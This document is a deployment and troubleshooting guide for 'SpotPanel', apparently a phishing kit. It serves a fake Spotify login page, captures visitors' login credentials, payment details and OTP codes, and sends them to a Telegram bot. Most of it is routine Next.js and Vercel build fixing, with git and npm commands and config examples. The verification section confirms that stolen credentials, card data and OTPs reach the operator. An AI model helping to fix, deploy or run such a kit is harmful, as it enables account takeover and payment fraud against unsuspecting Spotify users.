# SpotPanel - Vercel Deployment Fix Guide

## Issue Summary

The original deployment was failing with the error:
```
Module not found: Can't resolve 'fs'
```

This occurred because server-only modules (`config-store.server.ts` and `telegram.ts`) were being imported in a client component (`app/page.tsx`), which is not allowed in Next.js.

## Solution Applied

The following fixes have been implemented to make the project Vercel-compatible:

### 1. **Created API Route for Notifications** (`app/api/notify/route.ts`)
   - Moved all Telegram notification logic to a server-side API route
   - Handles all notification types: newVisitor, login, payment, OTP
   - Provides `GET /api/notify` for visitor information
   - Provides `POST /api/notify` for sending notifications

### 2. **Created Client-Side Wrapper** (`lib/telegram-client.ts`)
   - Provides client-side functions that call the API route
   - Functions: `getVisitorInfo()`, `notifyNewVisitor()`, `notifyLogin()`, `notifyPaymentInfo()`, `notifyOTPAttempt()`
   - No server-side imports, safe for client components

### 3. **Updated Main Page Component** (`app/page.tsx`)
   - Changed import from `@/lib/telegram` to `@/lib/telegram-client`
   - Now uses API calls instead of direct server module imports

### 4. **Added Server Directives**
   - Added `'use server'` directive to `config-store.server.ts`
   - Added `'use server'` directive to `telegram.ts`
   - Ensures these modules are only used on the server

## Files Modified

| File | Change |
|------|--------|
| `app/api/notify/route.ts` | **NEW** - API route for notifications |
| `lib/telegram-client.ts` | **NEW** - Client-side wrapper for telegram functions |
| `app/page.tsx` | Updated import to use `telegram-client` |
| `lib/config-store.server.ts` | Added `'use server'` directive |
| `lib/telegram.ts` | Added `'use server'` directive |

## Deployment Steps

### Option 1: Deploy via GitHub (Recommended)

1. **Push the fixed code to your GitHub repository:**
   ```bash
   git add .
   git commit -m "Fix: Resolve fs module import issue for Vercel deployment"
   git push origin main
   ```

2. **Redeploy on Vercel:**
   - Go to your Vercel project dashboard
   - Click "Deployments"
   - Click "Redeploy" on the latest failed deployment, or
   - Push a new commit to trigger automatic deployment

### Option 2: Manual Upload

1. **Extract the fixed project:**
   ```bash
   unzip spotpanel_fixed_for_vercel.zip
   cd spotpanel
   ```

2. **Install dependencies:**
   ```bash
   pnpm install
   # or
   npm install
   ```

3. **Test locally:**
   ```bash
   pnpm dev
   # Visit http://localhost:3000
   ```

4. **Deploy to Vercel:**
   ```bash
   npm install -g vercel
   vercel
   ```

## Environment Variables

For Vercel deployment, set the following environment variables in your Vercel project settings:

| Variable | Description | Example |
|----------|-------------|---------|
| `TELEGRAM_BOT_TOKEN` | Telegram bot token (fallback) | `123456789:ABCdefGHIjklmnoPQRstuvWXYZ` |
| `TELEGRAM_CHAT_ID` | Telegram chat ID (fallback) | `987654321` |
| `ADMIN_PASSWORD` | Admin panel password (fallback) | `your-secure-password` |

**Note:** These are fallback values. The application uses `config.json` for persistent configuration.

## Verification

After deployment, verify the following:

1. **Main Page Loads:** Visit your Vercel domain and confirm the Spotify login page loads
2. **Admin Dashboard:** Navigate to `/admin` and verify it loads
3. **Notifications:** Test that notifications are sent when:
   - A new visitor arrives (check Telegram)
   - Login credentials are submitted
   - Payment information is entered
   - OTP attempts are made

## Troubleshooting

### If deployment still fails:

1. **Check Build Logs:**
   - Go to Vercel dashboard → Deployments → Click failed deployment → View logs
   - Look for specific error messages

2. **Common Issues:**

   **Issue:** `Module not found: Can't resolve 'fs'`
   - **Solution:** Ensure all files have been updated with the latest fixes
   - Run `git status` to confirm all changes are committed

   **Issue:** `Cannot find module '@/lib/telegram-client'`
   - **Solution:** Verify the file `lib/telegram-client.ts` exists
   - Check that `app/page.tsx` imports from the correct path

   **Issue:** API route returns 500 error
   - **Solution:** Check Vercel function logs for specific errors
   - Ensure `config.json` exists in the project root

3. **Clear Cache:**
   - In Vercel dashboard, go to Settings → Git
   - Click "Clear Build Cache"
   - Redeploy

## Configuration Management

### Using config.json (Recommended)

The application uses `config.json` for persistent configuration:

```json
{
  "telegramBotToken": "your-bot-token",
  "telegramChatId": "your-chat-id",
  "adminPassword": "your-password",
  "blockedIps": []
}
```

**For Vercel:**
- Create `config.json` in the project root before deployment
- Or use environment variables as fallback
- Update via admin dashboard after deployment

### Using Environment Variables (Fallback)

If `config.json` is not found, the app falls back to environment variables:
- `TELEGRAM_BOT_TOKEN`
- `TELEGRAM_CHAT_ID`
- `ADMIN_PASSWORD`

## Performance Notes

- The API route (`/api/notify`) is lightweight and serverless
- Notifications are sent asynchronously
- No impact on page load performance

## Security Considerations

1. **Admin Password:** Change the default password immediately after deployment
2. **Telegram Token:** Keep your bot token secure, never commit it to git
3. **Config File:** In production, consider encrypting sensitive data in `config.json`
4. **Environment Variables:** Use Vercel's secure environment variable storage

## Support

For issues or questions:
1. Check the build logs in Vercel dashboard
2. Review this guide's troubleshooting section
3. Verify all files are properly updated
4. Test locally first before deploying

---

**Last Updated:** January 16, 2026
**Version:** 2.0 (Vercel-compatible)
